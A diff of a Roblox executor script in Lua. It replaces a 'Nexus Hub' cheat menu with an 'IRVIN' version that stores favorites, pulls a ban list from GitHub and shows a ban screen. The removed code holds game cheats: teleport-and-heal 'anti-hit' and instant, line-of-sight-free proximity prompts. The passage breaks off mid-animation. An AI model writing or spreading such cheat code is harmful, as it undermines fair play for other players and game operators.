@@ -1,1601 +1,3751 @@
--- ============================================================
--- Nexus Hub - Reconstrucción limpia
--- Sin key system, sin branding original
--- ============================================================
+-- ═══════════════════════════════════════════════════════
+-- IRVIN
+-- Copyright (c) 2026 IRVIN. All rights reserved.
+-- Owner: 8744263430 | Co-Owner: 2054814501
+--
+-- This software is the exclusive property of IRVIN.
+-- Copying, distribution or modification without express
+-- authorization from the author is strictly prohibited.
+-- ═══════════════════════════════════════════════════════
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local player = Players.LocalPlayer
 
-local TweenService        = game:GetService("TweenService")
-local ProximityPromptSvc  = game:GetService("ProximityPromptService")
-local RunService          = game:GetService("RunService")
-local Workspace           = game:GetService("Workspace")
-local Stats               = game:GetService("Stats")
-local TeleportService     = game:GetService("TeleportService")
-local HttpService         = game:GetService("HttpService")
-local UserInputService    = game:GetService("UserInputService")
-local Players             = game:GetService("Players")
-local GuiService          = game:GetService("GuiService")
+getgenv().IRVING_SCRIPT_ACTIVE = true
 
-local LocalPlayer = Players.LocalPlayer
-local Camera      = Workspace.CurrentCamera
-local PlaceId     = game.PlaceId
-local JobId       = game.JobId
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
 
--- Contenedor de UI
-local UI_CONTAINER
-pcall(function() UI_CONTAINER = gethui() end)
-if not UI_CONTAINER then
-    pcall(function() UI_CONTAINER = game:GetService("CoreGui") end)
-end
-if not UI_CONTAINER then
-    UI_CONTAINER = LocalPlayer:WaitForChild("PlayerGui")
+-- ═══════════════════════════════════════════════════════
+-- SISTEMA DE FAVORITOS PERSISTENTES
+-- ═══════════════════════════════════════════════════════
+local FAVORITES_FILE = "Irvinglz1_Favorites.json"
+getgenv().IRVING_FAVORITES = getgenv().IRVING_FAVORITES or {}
+
+local function supportsFileSystem()
+    return (writefile and readfile and isfile) ~= nil
 end
 
--- ============================================================
--- CONFIGURACIÓN
--- ============================================================
-local CONFIG = {
-    ScaleFile  = "nexus_scale.txt",
-    AvatarUser = "anki1362",
-    MinScale   = 0.5,
-    MaxScale   = 1,
-}
-
--- ============================================================
--- PERSISTENCIA DE ESCALA
--- ============================================================
-local function loadScale()
-    if readfile and isfile then
-        local ok, exists = pcall(isfile, CONFIG.ScaleFile)
-        if ok and exists then
-            local ok2, data = pcall(readfile, CONFIG.ScaleFile)
-            if ok2 and data and data ~= "" then
-                local n = tonumber(data)
-                if n then return math.clamp(n, CONFIG.MinScale, CONFIG.MaxScale) end
-            end
-        end
+local function loadFavorites()
+    getgenv().IRVING_FAVORITES = {}
+    if not supportsFileSystem() then
+        warn("[Irvinglz1] Tu ejecutor no soporta guardar archivos. Los favoritos no se guardarán.")
+        return false
     end
-    local nv = LocalPlayer:FindFirstChild("NexusScale")
-    if nv and nv:IsA("NumberValue") then
-        return math.clamp(nv.Value, CONFIG.MinScale, CONFIG.MaxScale)
-    end
-    return 1
-end
-
-local function saveScale(scale)
-    if writefile then
-        pcall(function() writefile(CONFIG.ScaleFile, tostring(scale)) end)
-    end
-    local nv = LocalPlayer:FindFirstChild("NexusScale")
-    if not nv then
-        nv = Instance.new("NumberValue")
-        nv.Name = "NexusScale"
-        nv.Parent = LocalPlayer
-    end
-    nv.Value = scale
-end
-
--- ============================================================
--- AVATAR DEL AUTOR
--- ============================================================
-local AUTHOR_AVATAR = Players:GetUserThumbnailAsync(
-    Players:GetUserIdFromNameAsync(CONFIG.AvatarUser),
-    Enum.ThumbnailType.HeadShot,
-    Enum.ThumbnailSize.Size420x420
-)
-
--- ============================================================
--- ANTI-HIT
--- ============================================================
-local ANTI_HIT_STATE = {
-    enabled = false,
-    promptConnection = nil,
-    savedHoldDurations = {},
-    connections = {},
-}
-
-local SAFE_CFRAMES = {
-    CFrame.new(4747.71, 70.57, -335.25),
-    CFrame.new(3520.94, 70.73, -343.74),
-    CFrame.new(2446.02, 70.88, -351.18),
-    CFrame.new(1352.11, 71.02, -358.75),
-    CFrame.new(544.49,  71.13, -364.34),
-}
-
-local function antiHitTeleport()
-    local char = LocalPlayer.Character
-    if not char then return end
-    local hum = char:FindFirstChildOfClass("Humanoid")
-    local hrp = char:FindFirstChild("HumanoidRootPart")
-    if not hum or not hrp then return end
-
-    local savedCF   = Camera.CFrame
-    local savedType = Camera.CameraType
-    Camera.CameraType = Enum.CameraType.Scriptable
-    Camera.CFrame = savedCF
-
-    hum.BreakJointsOnDeath = false
-    for _, v in ipairs(char:GetDescendants()) do
-        if v:IsA("Motor6D") then v.Enabled = true end
-    end
-
-    hrp.AssemblyLinearVelocity  = Vector3.zero
-    hrp.AssemblyAngularVelocity = Vector3.zero
-
-    for _, cf in ipairs(SAFE_CFRAMES) do
-        hum.PlatformStand = true
-        hum.Health = 100
-        hrp.CFrame = cf
-        hrp.AssemblyLinearVelocity  = Vector3.zero
-        Camera.CFrame = savedCF
-        task.wait(0.02)
-    end
-
-    local elapsed = os.clock()
-    local conn
-    conn = RunService.Heartbeat:Connect(function()
-        if os.clock() - elapsed > 0.35 then
-            conn:Disconnect()
-            return
-        end
-        hum.Health = 100
-        hum.PlatformStand = true
-        hrp.CFrame = SAFE_CFRAMES[#SAFE_CFRAMES]
-        hrp.AssemblyLinearVelocity  = Vector3.zero
-        hrp.AssemblyAngularVelocity = Vector3.zero
-        Camera.CFrame = savedCF
+    local success, exists = pcall(isfile, FAVORITES_FILE)
+    if not success or not exists then return false end
+    local readSuccess, content = pcall(readfile, FAVORITES_FILE)
+    if not readSuccess or not content or content == "" then return false end
+    local decodeSuccess, data = pcall(function()
+        return HttpService:JSONDecode(content)
     end)
-    task.wait(0.35)
-    hum.PlatformStand = false
-    Camera.CameraType = savedType
+    if not decodeSuccess or type(data) ~= "table" then
+        warn("[Irvinglz1] Archivo de favoritos corrupto. Se reiniciará.")
+        return false
+    end
+    getgenv().IRVING_FAVORITES = data
+    return true
 end
 
-local function applyPrompt(prompt)
-    if not prompt or not prompt:IsA("ProximityPrompt") then return end
-    if ANTI_HIT_STATE.enabled then
-        if ANTI_HIT_STATE.savedHoldDurations[prompt] == nil then
-            ANTI_HIT_STATE.savedHoldDurations[prompt] = prompt.HoldDuration
-        end
-        prompt.HoldDuration = 0
-        prompt.RequiresLineOfSight = false
-    elseif ANTI_HIT_STATE.savedHoldDurations[prompt] ~= nil then
-        prompt.HoldDuration = ANTI_HIT_STATE.savedHoldDurations[prompt]
-        ANTI_HIT_STATE.savedHoldDurations[prompt] = nil
-    end
+local function saveFavorites()
+    if not supportsFileSystem() then return false end
+    local encodeSuccess, encoded = pcall(function()
+        return HttpService:JSONEncode(getgenv().IRVING_FAVORITES)
+    end)
+    if not encodeSuccess then return false end
+    local writeSuccess = pcall(writefile, FAVORITES_FILE, encoded)
+    return writeSuccess
 end
 
-local function setAntiHit(enabled)
-    if enabled then
-        for _, d in ipairs(Workspace:GetDescendants()) do applyPrompt(d) end
-        table.insert(ANTI_HIT_STATE.connections, Workspace.DescendantAdded:Connect(applyPrompt))
-        table.insert(ANTI_HIT_STATE.connections, ProximityPromptSvc.PromptShown:Connect(applyPrompt))
-        return
+function AddFavorite(name, id)
+    if not name or not id then return false end
+    id = tostring(id)
+    for _, fav in ipairs(getgenv().IRVING_FAVORITES) do
+        if tostring(fav.id) == id then return false end
     end
-    for _, c in ipairs(ANTI_HIT_STATE.connections) do
-        if c then c:Disconnect() end
-    end
-    ANTI_HIT_STATE.connections = {}
-    for prompt, dur in pairs(ANTI_HIT_STATE.savedHoldDurations) do
-        if prompt and prompt.Parent then prompt.HoldDuration = dur end
-    end
-    ANTI_HIT_STATE.savedHoldDurations = {}
-end
-
--- ============================================================
--- HELPERS DE UI
--- ============================================================
-local function makeGradientRing(parent, sizeX, sizeY, posX, posY, zIndex)
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, sizeX, 0, sizeY)
-    frame.Position = UDim2.new(0.5, posX, 0.5, posY)
-    frame.AnchorPoint = Vector2.new(0.5, 0.5)
-    frame.BackgroundColor3 = Color3.fromRGB(60, 140, 255)
-    frame.BackgroundTransparency = 0.85
-    frame.BorderSizePixel = 0
-    frame.ZIndex = zIndex
-    frame.Parent = parent
-
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(1, 0)
-    corner.Parent = frame
-
-    local grad = Instance.new("UIGradient")
-    grad.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0,   Color3.fromRGB(60, 140, 255)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(180, 100, 255)),
-        ColorSequenceKeypoint.new(1,   Color3.fromRGB(60, 220, 255)),
+    table.insert(getgenv().IRVING_FAVORITES, {
+        name = name,
+        id = id,
+        added_at = os.time()
     })
-    grad.Rotation = 45
-    grad.Parent = frame
-    return frame, grad
+    saveFavorites()
+    return true
 end
 
-local function makeBar(parent, sizeX, sizeY, posX, posY, rotation, color, zIndex)
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, sizeX, 0, sizeY)
-    frame.Position = UDim2.new(0.5, posX, 0.5, posY)
-    frame.AnchorPoint = Vector2.new(0.5, 0.5)
-    frame.BackgroundColor3 = color
-    frame.BackgroundTransparency = 0.5
-    frame.BorderSizePixel = 0
-    frame.Rotation = rotation
-    frame.ZIndex = zIndex
-    frame.Parent = parent
-
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(1, 0)
-    corner.Parent = frame
-    return frame
-end
-
--- ============================================================
--- INTRO
--- ============================================================
-local function showIntro(onComplete)
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "NexusIntro"
-    gui.ResetOnSpawn = false
-    gui.IgnoreGuiInset = true
-    gui.DisplayOrder = 999
-    gui.Parent = UI_CONTAINER
-
-    local bg = Instance.new("Frame")
-    bg.Size = UDim2.new(1, 0, 1, 0)
-    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    bg.BackgroundTransparency = 1
-    bg.BorderSizePixel = 0
-    bg.ZIndex = 150
-    bg.Parent = gui
-    TweenService:Create(bg, TweenInfo.new(0.4), { BackgroundTransparency = 0.4 }):Play()
-
-    local container = Instance.new("Frame")
-    container.Size = UDim2.new(0, 500, 0, 150)
-    container.Position = UDim2.new(0.5, -250, 0.5, -75)
-    container.BackgroundTransparency = 1
-    container.ZIndex = 200
-    container.Parent = gui
-
-    local ring1, ring1Grad = makeGradientRing(container, 400, 130, 0, 0, 198)
-    local ring2, ring2Grad = makeGradientRing(container, 300, 90, 0, 0, 199)
-    local ring3 = makeGradientRing(container, 200, 55, 0, 0, 200)
-
-    ring1.BackgroundTransparency = 1
-    ring2.BackgroundTransparency = 1
-    ring3.BackgroundTransparency = 1
-
-    local bar1 = makeBar(container, 500, 2, 0, -45, 0, Color3.fromRGB(120, 180, 255), 197)
-    local bar2 = makeBar(container, 500, 2, 0,  45, 0, Color3.fromRGB(180, 120, 255), 197)
-    local bar3 = makeBar(container, 350, 1, 0, -60, 0, Color3.fromRGB(60, 220, 255), 197)
-    local bar4 = makeBar(container, 350, 1, 0,  60, 0, Color3.fromRGB(60, 220, 255), 197)
-    local bar5 = makeBar(container, 400, 1, 0, 0,  25, Color3.fromRGB(100, 200, 255), 196)
-    local bar6 = makeBar(container, 400, 1, 0, 0, -25, Color3.fromRGB(200, 100, 255), 196)
-
-    for _, b in ipairs({bar1, bar2, bar3, bar4, bar5, bar6}) do
-        b.BackgroundTransparency = 1
+function RemoveFavorite(id)
+    id = tostring(id)
+    for i, fav in ipairs(getgenv().IRVING_FAVORITES) do
+        if tostring(fav.id) == id then
+            table.remove(getgenv().IRVING_FAVORITES, i)
+            saveFavorites()
+            return true
+        end
     end
+    return false
+end
+
+function IsFavorite(id)
+    id = tostring(id)
+    for _, fav in ipairs(getgenv().IRVING_FAVORITES) do
+        if tostring(fav.id) == id then return true end
+    end
+    return false
+end
+
+function GetFavorites()
+    return getgenv().IRVING_FAVORITES
+end
+
+function ClearFavorites()
+    getgenv().IRVING_FAVORITES = {}
+    saveFavorites()
+end
+
+function ReloadFavorites()
+    loadFavorites()
+    return getgenv().IRVING_FAVORITES
+end
+
+loadFavorites()
+-- ═══════════════════════════════════════════════════════
+
+local bannedUsers = {}
+
+local GITHUB_RAW_URL = "https://raw.githubusercontent.com/67Studio/irving-hub-bans/refs/heads/main/bans.json"
+
+local function cargarBans()
+    local exito, respuesta = pcall(function()
+        return request({
+            Url = GITHUB_RAW_URL,
+            Method = "GET"
+        })
+    end)
+
+    if not exito or type(respuesta) ~= "table" then
+        return false
+    end
+
+    if respuesta.StatusCode ~= 200 then
+        return false
+    end
+
+    local decodeSuccess, data = pcall(function()
+        return HttpService:JSONDecode(respuesta.Body)
+    end)
+
+    if not decodeSuccess or type(data) ~= "table" then
+        return false
+    end
+
+    bannedUsers = data.bannedUsers or {}
+
+    return true
+end
+
+cargarBans()
+
+local function calcularTiempoRestante(expires_at)
+    if not expires_at then
+        return "Permanente"
+    end
+    
+    local ahora = os.time()
+    local expiracion = os.time({
+        year = tonumber(string.sub(expires_at, 1, 4)),
+        month = tonumber(string.sub(expires_at, 6, 7)),
+        day = tonumber(string.sub(expires_at, 9, 10)),
+        hour = tonumber(string.sub(expires_at, 12, 13)),
+        min = tonumber(string.sub(expires_at, 15, 16)),
+        sec = tonumber(string.sub(expires_at, 18, 19))
+    })
+    
+    local diferencia = expiracion - ahora
+    
+    if diferencia <= 0 then
+        return "0 segundos"
+    end
+    
+    local dias = math.floor(diferencia / 86400)
+    local horas = math.floor((diferencia % 86400) / 3600)
+    local minutos = math.floor((diferencia % 3600) / 60)
+    local segundos = math.floor(diferencia % 60)
+    
+    local resultado = {}
+    if dias > 0 then table.insert(resultado, dias .. " días") end
+    if horas > 0 then table.insert(resultado, horas .. " horas") end
+    if minutos > 0 then table.insert(resultado, minutos .. " minutos") end
+    if segundos > 0 or #resultado == 0 then table.insert(resultado, segundos .. " segundos") end
+    
+    return table.concat(resultado, " ")
+end
+
+local function obtenerInfoBaneo()
+    local currentName = string.lower(player.Name)
+    
+    for _, banData in ipairs(bannedUsers) do
+        local username = banData.username or banData
+        
+        if type(username) == "table" then
+            username = username.username or ""
+        end
+        
+        if string.lower(tostring(username)) == currentName then
+            return {
+                baneado = true,
+                motivo = banData.reason or "No especificado",
+                duracion = banData.duration or "Permanente",
+                expires_at = banData.expires_at,
+                fecha = banData.banned_at or "Desconocida"
+            }
+        end
+    end
+    
+    return { baneado = false }
+end
+
+local function partirTexto(texto, maxCaracteres)
+    if not texto or texto == "" then
+        return {"No especificado"}
+    end
+    
+    local lineas = {}
+    local lineaActual = ""
+    
+    for palabra in texto:gmatch("%S+") do
+        if #lineaActual + #palabra + 1 <= maxCaracteres then
+            if lineaActual == "" then
+                lineaActual = palabra
+            else
+                lineaActual = lineaActual .. " " .. palabra
+            end
+        else
+            table.insert(lineas, lineaActual)
+            lineaActual = palabra
+        end
+    end
+    
+    if lineaActual ~= "" then
+        table.insert(lineas, lineaActual)
+    end
+    
+    return lineas
+end
+
+local info = obtenerInfoBaneo()
+
+if info.baneado then
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "Irvinglz1_BanScreen"
+    gui.IgnoreGuiInset = true
+    gui.ResetOnSpawn = false
+    gui.Parent = game:GetService("CoreGui")
+
+    local frame = Instance.new("Frame")
+    frame.Parent = gui
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.Position = UDim2.new(0, 0, 0, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    frame.BorderSizePixel = 0
+    frame.BackgroundTransparency = 0
 
     local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, 0, 0, 80)
-    title.Position = UDim2.new(0, 0, 0.5, -40)
+    title.Parent = frame
+    title.AnchorPoint = Vector2.new(0.5, 0.5)
+    title.Position = UDim2.new(0.5, 0, 0.20, 0)
+    title.Size = UDim2.new(0, 700, 0, 120)
     title.BackgroundTransparency = 1
-    title.Text = "Nexus Hub"
-    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    title.Text = "‼️ BANEADO ‼️"
+    title.TextColor3 = Color3.fromRGB(255, 0, 0)
+    title.TextScaled = true
     title.Font = Enum.Font.GothamBold
-    title.TextSize = 56
-    title.TextStrokeTransparency = 0.3
-    title.TextStrokeColor3 = Color3.fromRGB(60, 140, 255)
     title.TextTransparency = 1
-    title.ZIndex = 210
-    title.Parent = container
 
-    local titleGrad = Instance.new("UIGradient")
-    titleGrad.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0,   Color3.fromRGB(255, 255, 255)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(120, 200, 255)),
-        ColorSequenceKeypoint.new(1,   Color3.fromRGB(255, 255, 255)),
-    })
-    titleGrad.Parent = title
+    local motivoTitle = Instance.new("TextLabel")
+    motivoTitle.Parent = frame
+    motivoTitle.AnchorPoint = Vector2.new(0.5, 0.5)
+    motivoTitle.Position = UDim2.new(0.5, 0, 0.35, 0)
+    motivoTitle.Size = UDim2.new(0, 600, 0, 60)
+    motivoTitle.BackgroundTransparency = 1
+    motivoTitle.Text = "MOTIVO"
+    motivoTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    motivoTitle.TextScaled = true
+    motivoTitle.Font = Enum.Font.GothamBold
+    motivoTitle.TextTransparency = 1
+    motivoTitle.Visible = false
 
-    local subtitle = Instance.new("TextLabel")
-    subtitle.Size = UDim2.new(1, 0, 0, 20)
-    subtitle.Position = UDim2.new(0, 0, 0.5, 38)
-    subtitle.BackgroundTransparency = 1
-    subtitle.Text = "PREMIUM HUB"
-    subtitle.TextColor3 = Color3.fromRGB(120, 180, 255)
-    subtitle.Font = Enum.Font.GothamBold
-    subtitle.TextSize = 14
-    subtitle.TextTransparency = 1
-    subtitle.ZIndex = 210
-    subtitle.Parent = container
+    local motivoLabel = Instance.new("TextLabel")
+    motivoLabel.Parent = frame
+    motivoLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    motivoLabel.Position = UDim2.new(0.5, 0, 0.47, 0)
+    motivoLabel.Size = UDim2.new(0, 650, 0, 80)
+    motivoLabel.BackgroundTransparency = 1
+    motivoLabel.Text = ""
+    motivoLabel.TextColor3 = Color3.fromRGB(255, 200, 200)
+    motivoLabel.TextScaled = true
+    motivoLabel.Font = Enum.Font.GothamBold
+    motivoLabel.TextTransparency = 1
+    motivoLabel.Visible = false
+    motivoLabel.TextWrapped = true
 
-    -- Entrada
-    task.spawn(function()
-        TweenService:Create(ring1, TweenInfo.new(1, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
-            Size = UDim2.new(0, 400, 0, 130), BackgroundTransparency = 0.75
-        }):Play()
-        task.wait(0.15)
-        TweenService:Create(ring2, TweenInfo.new(0.9, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
-            Size = UDim2.new(0, 300, 0, 90), BackgroundTransparency = 0.82
-        }):Play()
-        task.wait(0.15)
-        TweenService:Create(ring3, TweenInfo.new(0.8, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
-            Size = UDim2.new(0, 200, 0, 55), BackgroundTransparency = 0.9
-        }):Play()
+    local tiempoTitle = Instance.new("TextLabel")
+    tiempoTitle.Parent = frame
+    tiempoTitle.AnchorPoint = Vector2.new(0.5, 0.5)
+    tiempoTitle.Position = UDim2.new(0.5, 0, 0.58, 0)
+    tiempoTitle.Size = UDim2.new(0, 600, 0, 60)
+    tiempoTitle.BackgroundTransparency = 1
+    tiempoTitle.Text = "TIEMPO RESTANTE"
+    tiempoTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    tiempoTitle.TextScaled = true
+    tiempoTitle.Font = Enum.Font.GothamBold
+    tiempoTitle.TextTransparency = 1
+    tiempoTitle.Visible = false
 
-        title.TextTransparency = 0
-        TweenService:Create(title, TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
-            Size = UDim2.new(1, 0, 0, 80),
-            Position = UDim2.new(0, 0, 0.5, -40)
-        }):Play()
-        task.wait(0.3)
-        subtitle.TextTransparency = 0
-        TweenService:Create(subtitle, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
-            Position = UDim2.new(0, 0, 0.5, 38)
-        }):Play()
-        task.wait(0.2)
-        TweenService:Create(bar1, TweenInfo.new(0.6, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
-            BackgroundTransparency = 0.2, Size = UDim2.new(0, 600, 0, 2)
-        }):Play()
-        TweenService:Create(bar2, TweenInfo.new(0.6, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
-            BackgroundTransparency = 0.2, Size = UDim2.new(0, 600, 0, 2)
-        }):Play()
-        TweenService:Create(bar3, TweenInfo.new(0.6, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
-            BackgroundTransparency = 0.3, Size = UDim2.new(0, 450, 0, 1)
-        }):Play()
-        TweenService:Create(bar4, TweenInfo.new(0.6, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
-            BackgroundTransparency = 0.3, Size = UDim2.new(0, 450, 0, 1)
-        }):Play()
-        TweenService:Create(bar5, TweenInfo.new(0.7, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
-            BackgroundTransparency = 0.5, Size = UDim2.new(0, 500, 0, 1)
-        }):Play()
-        TweenService:Create(bar6, TweenInfo.new(0.7, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
-            BackgroundTransparency = 0.5, Size = UDim2.new(0, 500, 0, 1)
-        }):Play()
-    end)
+    local tiempoLabel = Instance.new("TextLabel")
+    tiempoLabel.Parent = frame
+    tiempoLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    tiempoLabel.Position = UDim2.new(0.5, 0, 0.70, 0)
+    tiempoLabel.Size = UDim2.new(0, 650, 0, 70)
+    tiempoLabel.BackgroundTransparency = 1
+    tiempoLabel.Text = ""
+    tiempoLabel.TextColor3 = Color3.fromRGB(255, 220, 100)
+    tiempoLabel.TextScaled = true
+    tiempoLabel.Font = Enum.Font.GothamBold
+    tiempoLabel.TextTransparency = 1
+    tiempoLabel.Visible = false
 
-    -- Animaciones continuas
-    task.spawn(function()
-        while gui.Parent do
-            TweenService:Create(ring1, TweenInfo.new(1.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Size = UDim2.new(0, 460, 0, 155), BackgroundTransparency = 0.65
-            }):Play()
-            task.wait(1.4)
-            TweenService:Create(ring1, TweenInfo.new(1.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Size = UDim2.new(0, 400, 0, 130), BackgroundTransparency = 0.75
-            }):Play()
-            task.wait(1.4)
-        end
-    end)
-    task.spawn(function()
+    local contactTitle = Instance.new("TextLabel")
+    contactTitle.Parent = frame
+    contactTitle.AnchorPoint = Vector2.new(0.5, 0.5)
+    contactTitle.Position = UDim2.new(0.5, 0, 0.80, 0)
+    contactTitle.Size = UDim2.new(0, 600, 0, 60)
+    contactTitle.BackgroundTransparency = 1
+    contactTitle.Text = "CONTACTO"
+    contactTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    contactTitle.TextScaled = true
+    contactTitle.Font = Enum.Font.GothamBold
+    contactTitle.TextTransparency = 1
+    contactTitle.Visible = false
+
+    local contactLabel = Instance.new("TextLabel")
+    contactLabel.Parent = frame
+    contactLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+    contactLabel.Position = UDim2.new(0.5, 0, 0.90, 0)
+    contactLabel.Size = UDim2.new(0, 650, 0, 60)
+    contactLabel.BackgroundTransparency = 1
+    contactLabel.Text = ""
+    contactLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
+    contactLabel.TextScaled = true
+    contactLabel.Font = Enum.Font.GothamBold
+    contactLabel.TextTransparency = 1
+    contactLabel.Visible = false
+    contactLabel.TextWrapped = true
+
+    local function mostrarMotivoConAnimacion()
+        local lineas = partirTexto(info.motivo, 25)
+        local textoFinal = table.concat(lineas, "\n")
+        motivoLabel.Text = textoFinal
+        
+        motivoTitle.Visible = true
+        motivoTitle.TextTransparency = 1
+        TweenService:Create(motivoTitle, TweenInfo.new(0.8), {
+            TextTransparency = 0
+        }):Play()
+        task.wait(0.8)
+        
+        motivoLabel.Visible = true
+        motivoLabel.TextTransparency = 1
+        TweenService:Create(motivoLabel, TweenInfo.new(0.8), {
+            TextTransparency = 0
+        }):Play()
+        task.wait(0.8)
+        
+        task.wait(2.5)
+        
+        TweenService:Create(motivoTitle, TweenInfo.new(0.5), {
+            TextTransparency = 1
+        }):Play()
+        TweenService:Create(motivoLabel, TweenInfo.new(0.5), {
+            TextTransparency = 1
+        }):Play()
         task.wait(0.5)
-        while gui.Parent do
-            TweenService:Create(ring2, TweenInfo.new(1.1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Size = UDim2.new(0, 340, 0, 105), BackgroundTransparency = 0.75
-            }):Play()
-            task.wait(1.1)
-            TweenService:Create(ring2, TweenInfo.new(1.1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Size = UDim2.new(0, 300, 0, 90), BackgroundTransparency = 0.82
-            }):Play()
-            task.wait(1.1)
+        
+        motivoTitle.Visible = false
+        motivoLabel.Visible = false
+    end
+
+    local function mostrarTiempoConAnimacion()
+        local function actualizarTiempo()
+            return calcularTiempoRestante(info.expires_at)
+        end
+        
+        tiempoLabel.Text = actualizarTiempo()
+        
+        tiempoTitle.Visible = true
+        tiempoTitle.TextTransparency = 1
+        TweenService:Create(tiempoTitle, TweenInfo.new(0.8), {
+            TextTransparency = 0
+        }):Play()
+        task.wait(0.8)
+        
+        tiempoLabel.Visible = true
+        tiempoLabel.TextTransparency = 1
+        TweenService:Create(tiempoLabel, TweenInfo.new(0.8), {
+            TextTransparency = 0
+        }):Play()
+        task.wait(0.8)
+        
+        local tiempoTask = task.spawn(function()
+            while tiempoLabel.TextTransparency == 0 and gui.Parent do
+                task.wait(1)
+                tiempoLabel.Text = actualizarTiempo()
+            end
+        end)
+        
+        task.wait(3)
+        
+        task.cancel(tiempoTask)
+        TweenService:Create(tiempoTitle, TweenInfo.new(0.5), {
+            TextTransparency = 1
+        }):Play()
+        TweenService:Create(tiempoLabel, TweenInfo.new(0.5), {
+            TextTransparency = 1
+        }):Play()
+        task.wait(0.5)
+        
+        tiempoTitle.Visible = false
+        tiempoLabel.Visible = false
+    end
+
+    local function mostrarContactoConAnimacion()
+        contactLabel.Text = "discord.gg/xF8KX6WkN"
+        
+        contactTitle.Visible = true
+        contactTitle.TextTransparency = 1
+        TweenService:Create(contactTitle, TweenInfo.new(0.8), {
+            TextTransparency = 0
+        }):Play()
+        task.wait(0.8)
+        
+        contactLabel.Visible = true
+        contactLabel.TextTransparency = 1
+        TweenService:Create(contactLabel, TweenInfo.new(0.8), {
+            TextTransparency = 0
+        }):Play()
+        task.wait(0.8)
+        
+        task.wait(2.5)
+        
+        TweenService:Create(contactTitle, TweenInfo.new(0.5), {
+            TextTransparency = 1
+        }):Play()
+        TweenService:Create(contactLabel, TweenInfo.new(0.5), {
+            TextTransparency = 1
+        }):Play()
+        task.wait(0.5)
+        
+        contactTitle.Visible = false
+        contactLabel.Visible = false
+    end
+
+    local fadeInTitle = TweenService:Create(
+        title,
+        TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        { TextTransparency = 0 }
+    )
+    fadeInTitle:Play()
+    
+    task.spawn(function()
+        while title.Visible and gui.Parent do
+            local tween1 = TweenService:Create(
+                title,
+                TweenInfo.new(0.8),
+                { TextColor3 = Color3.fromRGB(255, 80, 80) }
+            )
+            local tween2 = TweenService:Create(
+                title,
+                TweenInfo.new(0.8),
+                { TextColor3 = Color3.fromRGB(255, 0, 0) }
+            )
+            tween1:Play()
+            tween1.Completed:Wait()
+            if not gui.Parent or not title.Visible then break end
+            tween2:Play()
+            tween2.Completed:Wait()
         end
     end)
-    task.spawn(function()
-        while gui.Parent do
-            TweenService:Create(ring1Grad, TweenInfo.new(3, Enum.EasingStyle.Linear), { Rotation = 405 }):Play()
-            task.wait(3)
-        end
-    end)
-    task.spawn(function()
-        while gui.Parent do
-            TweenService:Create(ring2Grad, TweenInfo.new(2.5, Enum.EasingStyle.Linear), { Rotation = -315 }):Play()
-            task.wait(2.5)
-        end
-    end)
-    task.spawn(function()
-        while gui.Parent do
-            TweenService:Create(bar1, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Size = UDim2.new(0, 680, 0, 2), BackgroundTransparency = 0
-            }):Play()
-            TweenService:Create(bar2, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Size = UDim2.new(0, 680, 0, 2), BackgroundTransparency = 0
-            }):Play()
-            task.wait(1.2)
-            TweenService:Create(bar1, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Size = UDim2.new(0, 500, 0, 2), BackgroundTransparency = 0.3
-            }):Play()
-            TweenService:Create(bar2, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Size = UDim2.new(0, 500, 0, 2), BackgroundTransparency = 0.3
-            }):Play()
-            task.wait(1.2)
-        end
-    end)
-    task.spawn(function()
-        while gui.Parent do
-            TweenService:Create(bar5, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Rotation = 40, BackgroundTransparency = 0.2
-            }):Play()
-            TweenService:Create(bar6, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Rotation = -40, BackgroundTransparency = 0.2
-            }):Play()
-            task.wait(2)
